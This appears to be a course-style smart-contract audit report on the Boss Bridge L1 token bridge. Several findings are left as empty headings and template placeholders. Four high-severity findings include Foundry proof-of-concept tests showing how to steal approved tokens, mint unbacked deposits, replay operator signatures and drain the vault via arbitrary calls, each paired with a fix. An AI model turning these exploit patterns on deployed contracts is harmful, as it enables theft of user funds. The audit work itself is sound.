---
title: Boss Bridge Audit Report
author: Luo Yingjie
date: October 21, 2024
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---

\begin{titlepage}
\centering
\begin{figure}[h]
\centering
\includegraphics[width=0.5\textwidth]{logo.pdf}
\end{figure}
\vspace{2cm}
{\Huge\bfseries Boss Bridge Audit Report\par}
\vspace{1cm}
{\Large Version 1.0\par}
\vspace{2cm}
{\Large\itshape Luo Yingjie\par}
\vfill
{\large \today\par}
\end{titlepage}

\maketitle

<!-- Your report starts here! -->

Prepared by: [Luo Yingjie](https://github.com/cqlyj)
Lead Auditors:

- Luo Yingjie

Assisting Auditors:

- None

# Table of Contents

- [Table of Contents](#table-of-contents)
- [About LUO YINGJIE](#about-luo-yingjie)
- [Protocol Summary](#protocol-summary)
- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Audit Details](#audit-details)
  - [Scope](#scope)
  - [Roles](#roles)
- [Executive Summary](#executive-summary)
  - [Issues found](#issues-found)
- [Findings](#findings)
  - [High](#high)
    - [\[H-1\] Users who give tokens approvals to `L1BossBridge` may have those assets stolen](#h-1-users-who-give-tokens-approvals-to-l1bossbridge-may-have-those-assets-stolen)
    - [\[H-2\] Calling `depositTokensToL2` from the Vault contract to the Vault contract allows infinite minting of unbacked tokens](#h-2-calling-deposittokenstol2-from-the-vault-contract-to-the-vault-contract-allows-infinite-minting-of-unbacked-tokens)
    - [\[H-3\] Lack of replay protection in `withdrawTokensToL1` allows withdrawals by signature to be replayed](#h-3-lack-of-replay-protection-in-withdrawtokenstol1-allows-withdrawals-by-signature-to-be-replayed)
    - [\[H-4\] `L1BossBridge::sendToL1` allowing arbitrary calls enables users to call `L1Vault::approveTo` and give themselves infinite allowance of vault funds](#h-4-l1bossbridgesendtol1-allowing-arbitrary-calls-enables-users-to-call-l1vaultapproveto-and-give-themselves-infinite-allowance-of-vault-funds)
    - [\[H-5\] `CREATE` opcode does not work on zksync era](#h-5-create-opcode-does-not-work-on-zksync-era)
    - [\[H-6\] `L1BossBridge::depositTokensToL2`'s `DEPOSIT_LIMIT` check allows contract to be DoS'd](#h-6-l1bossbridgedeposittokenstol2s-deposit_limit-check-allows-contract-to-be-dosd)
    - [\[H-7\] The `L1BossBridge::withdrawTokensToL1` function has no validation on the withdrawal amount being the same as the deposited amount in `L1BossBridge::depositTokensToL2`, allowing attacker to withdraw more funds than deposited](#h-7-the-l1bossbridgewithdrawtokenstol1-function-has-no-validation-on-the-withdrawal-amount-being-the-same-as-the-deposited-amount-in-l1bossbridgedeposittokenstol2-allowing-attacker-to-withdraw-more-funds-than-deposited)
    - [\[H-8\] `TokenFactory::deployToken` locks tokens forever](#h-8-tokenfactorydeploytoken-locks-tokens-forever)
  - [Medium](#medium)
    - [\[M-1\] Withdrawals are prone to unbounded gas consumption due to return bombs](#m-1-withdrawals-are-prone-to-unbounded-gas-consumption-due-to-return-bombs)
  - [Low](#low)
    - [\[L-1\] Lack of event emission during withdrawals and sending tokesn to L1](#l-1-lack-of-event-emission-during-withdrawals-and-sending-tokesn-to-l1)
    - [\[L-2\] `TokenFactory::deployToken` can create multiple token with same `symbol`](#l-2-tokenfactorydeploytoken-can-create-multiple-token-with-same-symbol)
    - [\[L-3\] Unsupported opcode PUSH0](#l-3-unsupported-opcode-push0)
  - [Informational](#informational)
    - [\[I-1\] Insufficient test coverage](#i-1-insufficient-test-coverage)

# About LUO YINGJIE

LUO YINGJIE is a blockchain developer and security researcher. With massive experience in the blockchain, he has audited numerous projects and has a deep understanding of the blockchain ecosystem. ....(add more about the auditor)

# Protocol Summary

The Boss Bridge is a bridging mechanism to move an ERC20 token (the "Boss Bridge Token" or "BBT") from L1 to an L2 the development team claims to be building. Because the L2 part of the bridge is under construction, it was not included in the reviewed codebase.

The bridge is intended to allow users to deposit tokens, which are to be held in a vault contract on L1. Successful deposits should trigger an event that an off-chain mechanism is in charge of detecting to mint the corresponding tokens on the L2 side of the bridge.

Withdrawals must be approved operators (or "signers"). Essentially they are expected to be one or more off-chain services where users request withdrawals, and that should verify requests before signing the data users must use to withdraw their tokens. It's worth highlighting that there's little-to-no on-chain mechanism to verify withdrawals, other than the operator's signature. So the Boss Bridge heavily relies on having robust, reliable and always available operators to approve withdrawals. Any rogue operator or compromised signing key may put at risk the entire protocol.

# Disclaimer

The Luo Yingjie team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.

# Risk Classification

|            |        | Impact |        |     |
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

We use the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity) severity matrix to determine severity. See the documentation for more details.

# Audit Details

- Commit Hash: 07af21653ab3e8a8362bf5f63eb058047f562375

## Scope

```
#-- src
|   #-- L1BossBridge.sol
|   #-- L1Token.sol
|   #-- L1Vault.sol
|   #-- TokenFactory.sol
```

## Roles

- Bridge owner: can pause and unpause withdrawals in the `L1BossBridge` contract. Also, can add and remove operators. Rogue owners or compromised keys may put at risk all bridge funds.
- User: Accounts that hold BBT tokens and use the `L1BossBridge` contract to deposit and withdraw them.
- Operator: Accounts approved by the bridge owner that can sign withdrawal operations. Rogue operators or compromised keys may put at risk all bridge funds.

# Executive Summary

_Add some notes of how the audit went, types of issues found, etc._

_We spend X hours with Y auditors using Z tools, etc._

## Issues found

| Severity          | Number of issues found |
| ----------------- | ---------------------- |
| High              | 8                      |
| Medium            | 1                      |
| Low               | 3                      |
| Info              | 1                      |
| Gas Optimizations | 0                      |
| Total             | 13                     |

# Findings

## High

### [H-1] Users who give tokens approvals to `L1BossBridge` may have those assets stolen

**Description:**

The `depositTokensToL2` function allows anyone to call it with a `from` address of any account that has approved tokens to the bridge.

**Impact:**

As a consequence, an attacker can move tokens out of any victim account whose token allowance to the bridge is greater than zero. This will move the tokens into the bridge vault, and assign them to the attacker's address in L2 (setting an attacker-controlled address in the `l2Recipient` parameter).

**Proof of Concept:**

<details>

place the following code in the `L1BossBridge.t.sol` file:

<summary>PoC</summary>

```javascript
function testUsersCanMoveApprovedTokensOfOthers() public {
        vm.prank(user);
        token.approve(address(tokenBridge), type(uint256).max);

        uint256 depositAmount = token.balanceOf(address(user));
        address attacker = makeAddr("attacker");
        vm.startPrank(attacker);
        vm.expectEmit(address(tokenBridge));
        emit Deposit(user, attacker, depositAmount);
        tokenBridge.depositTokensToL2(user, attacker, depositAmount);
        vm.stopPrank();

        assertEq(token.balanceOf(address(user)), 0);
        assertEq(token.balanceOf(address(vault)), depositAmount);
    }

```

</details>

**Recommended Mitigation:**

Consider modifying the `depositTokensToL2` function so that the caller cannot specify a `from` address.

```diff
- function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
+ function depositTokensToL2(address l2Recipient, uint256 amount) external whenNotPaused {
    if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
        revert L1BossBridge__DepositLimitReached();
    }
-   token.transferFrom(from, address(vault), amount);
+   token.transferFrom(msg.sender, address(vault), amount);

    // Our off-chain service picks up this event and mints the corresponding tokens on L2
-   emit Deposit(from, l2Recipient, amount);
+   emit Deposit(msg.sender, l2Recipient, amount);
}
```

### [H-2] Calling `depositTokensToL2` from the Vault contract to the Vault contract allows infinite minting of unbacked tokens

**Description:**

`depositTokensToL2` function allows the caller to specify the `from` address, from which tokens are taken.

Because the vault grants infinite approval to the bridge already (as can be seen in the contract's constructor), it's possible for an attacker to call the `depositTokensToL2` function and transfer tokens from the vault to the vault itself.

**Impact:**

This would allow the attacker to trigger the `Deposit` event any number of times, presumably causing the minting of unbacked tokens in L2.

Additionally, they could mint all the tokens to themselves.

**Proof of Concept:**

<details>

place the following code in the `L1BossBridge.t.sol` file:

<summary> PoC </summary>

```javascript
function testCanTransferFromVaultToVault() public {
        address attacker = makeAddr("attacker");

        uint256 valueBalance = 100 ether;
        deal(address(token), address(vault), valueBalance);

        vm.expectEmit(address(tokenBridge));
        emit Deposit(address(vault), attacker, valueBalance);
        tokenBridge.depositTokensToL2(address(vault), attacker, valueBalance);

        // can do this forever?
        vm.expectEmit(address(tokenBridge));
        emit Deposit(address(vault), attacker, valueBalance);
        tokenBridge.depositTokensToL2(address(vault), attacker, valueBalance);
    }
```

</details>

**Recommended Mitigation:**

As suggested in H-1, consider modifying the `depositTokensToL2` function so that the caller cannot specify a `from` address.

### [H-3] Lack of replay protection in `withdrawTokensToL1` allows withdrawals by signature to be replayed

**Description:**

Users who want to withdraw tokens from the bridge can call the `sendToL1` function, or the wrapper `withdrawTokensToL1` function. These functions require the caller to send along some withdrawal data signed by one of the approved bridge operators.

However, the signatures do not include any kind of replay-protection mechanisn (e.g., nonces).

**Impact:**

Therefore, valid signatures from any bridge operator can be reused by any attacker to continue executing withdrawals until the vault is completely drained.

**Proof of Concept:**

<details>

place the following code in the `L1BossBridge.t.sol` file:

<summary> PoC </summary>

```javascript
 function testSignatureReplay() public {
        uint256 vaultInitialBalance = 1000 ether;
        uint256 attackerInitialBalance = 100 ether;
        address attacker = makeAddr("attacker");
        deal(address(token), address(vault), vaultInitialBalance);
        deal(address(token), address(attacker), attackerInitialBalance);

        // attacker deposits
        vm.startPrank(attacker);
        token.approve(address(tokenBridge), type(uint256).max);
        tokenBridge.depositTokensToL2(
            attacker,
            attacker,
            attackerInitialBalance
        );
        vm.stopPrank();

        // signer signs the withdrawal
        bytes memory message = abi.encode(
            address(token),
            0,
            abi.encodeCall(
                IERC20.transferFrom,
                (address(vault), attacker, attackerInitialBalance)
            )
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(
            operator.key,
            MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encodePacked(message))
            )
        );

        while (token.balanceOf(address(vault)) > 0) {
            tokenBridge.withdrawTokensToL1(
                attacker,
                attackerInitialBalance,
                v,
                r,
                s
            );
        }

        assertEq(token.balanceOf(address(vault)), 0);
        assertEq(
            token.balanceOf(address(attacker)),
            vaultInitialBalance + attackerInitialBalance
        );
    }
```

</details>

**Recommended Mitigation:**

Consider redesigning the withdrawal mechanism so that it includes replay protection.

### [H-4] `L1BossBridge::sendToL1` allowing arbitrary calls enables users to call `L1Vault::approveTo` and give themselves infinite allowance of vault funds

**Description:**

The `L1BossBridge` contract includes the `sendToL1` function that, if called with a valid signature by an operator, can execute arbitrary low-level calls to any given target. Because there's no restrictions neither on the target nor the calldata, this call could be used by an attacker to execute sensitive contracts of the bridge. For example, the `L1Vault` contract.

**Impact:**

The `L1BossBridge` contract owns the `L1Vault` contract. Therefore, an attacker could submit a call that targets the vault and executes is `approveTo` function, passing an attacker-controlled address to increase its allowance. This would then allow the attacker to completely drain the vault.

It's worth noting that this attack's likelihood depends on the level of sophistication of the off-chain validations implemented by the operators that approve and sign withdrawals. However, we're rating it as a High severity issue because, according to the available documentation, the only validation made by off-chain services is that "the account submitting the withdrawal has first originated a successful deposit in the L1 part of the bridge". As the next PoC shows, such validation is not enough to prevent the attack.

**Proof of Concept:**

<details>

place the following code in the `L1BossBridge.t.sol` file:

<summary> PoC </summary>

```javascript

function testCanCallVaultApproveFromBridgeAndDrainVault() public {
    uint256 vaultInitialBalance = 1000e18;
    deal(address(token), address(vault), vaultInitialBalance);

    // An attacker deposits tokens to L2. We do this under the assumption that the
    // bridge operator needs to see a valid deposit tx to then allow us to request a withdrawal.
    vm.startPrank(attacker);
    vm.expectEmit(address(tokenBridge));
    emit Deposit(address(attacker), address(0), 0);
    tokenBridge.depositTokensToL2(attacker, address(0), 0);

    // Under the assumption that the bridge operator doesn't validate bytes being signed
    bytes memory message = abi.encode(
        address(vault), // target
        0, // value
        abi.encodeCall(L1Vault.approveTo, (address(attacker), type(uint256).max)) // data
    );
    (uint8 v, bytes32 r, bytes32 s) = _signMessage(message, operator.key);

    tokenBridge.sendToL1(v, r, s, message);
    assertEq(token.allowance(address(vault), attacker), type(uint256).max);
    token.transferFrom(address(vault), attacker, token.balanceOf(address(vault)));
}

```

</details>

**Recommended Mitigation:**

Consider disallowing attacker-controlled external calls to sensitive components of the bridge, such as the `L1Vault` contract.

### [H-5] `CREATE` opcode does not work on zksync era

### [H-6] `L1BossBridge::depositTokensToL2`'s `DEPOSIT_LIMIT` check allows contract to be DoS'd

### [H-7] The `L1BossBridge::withdrawTokensToL1` function has no validation on the withdrawal amount being the same as the deposited amount in `L1BossBridge::depositTokensToL2`, allowing attacker to withdraw more funds than deposited

### [H-8] `TokenFactory::deployToken` locks tokens forever

## Medium

### [M-1] Withdrawals are prone to unbounded gas consumption due to return bombs

During withdrawals, the L1 part of the bridge executes a low-level call to an arbitrary target passing all available gas. While this would work fine for regular targets, it may not for adversarial ones.

In particular, a malicious target may drop a [return bomb](https://github.com/nomad-xyz/ExcessivelySafeCall) to the caller. This would be done by returning an large amount of returndata in the call, which Solidity would copy to memory, thus increasing gas costs due to the expensive memory operations. Callers unaware of this risk may not set the transaction's gas limit sensibly, and therefore be tricked to spent more ETH than necessary to execute the call.

If the external call's returndata is not to be used, then consider modifying the call to avoid copying any of the data. This can be done in a custom implementation, or reusing external libraries such as [this one](https://github.com/nomad-xyz/ExcessivelySafeCall).

## Low

### [L-1] Lack of event emission during withdrawals and sending tokesn to L1

Neither the `sendToL1` function nor the `withdrawTokensToL1` function emit an event when a withdrawal operation is successfully executed. This prevents off-chain monitoring mechanisms to monitor withdrawals and raise alerts on suspicious scenarios.

Modify the `sendToL1` function to include a new event that is always emitted upon completing withdrawals.

_Not shown in video_

### [L-2] `TokenFactory::deployToken` can create multiple token with same `symbol`

_Not shown in video_

### [L-3] Unsupported opcode PUSH0

## Informational

### [I-1] Insufficient test coverage

```
Running tests...
| File                 | % Lines        | % Statements   | % Branches    | % Funcs       |
| -------------------- | -------------- | -------------- | ------------- | ------------- |
| src/L1BossBridge.sol | 86.67% (13/15) | 90.00% (18/20) | 83.33% (5/6)  | 83.33% (5/6)  |
| src/L1Vault.sol      | 0.00% (0/1)    | 0.00% (0/1)    | 100.00% (0/0) | 0.00% (0/1)   |
| src/TokenFactory.sol | 100.00% (4/4)  | 100.00% (4/4)  | 100.00% (0/0) | 100.00% (2/2) |
| Total                | 85.00% (17/20) | 88.00% (22/25) | 83.33% (5/6)  | 77.78% (7/9)  |
```

**Recommended Mitigation:** Aim to get test coverage up to over 90% for all files.
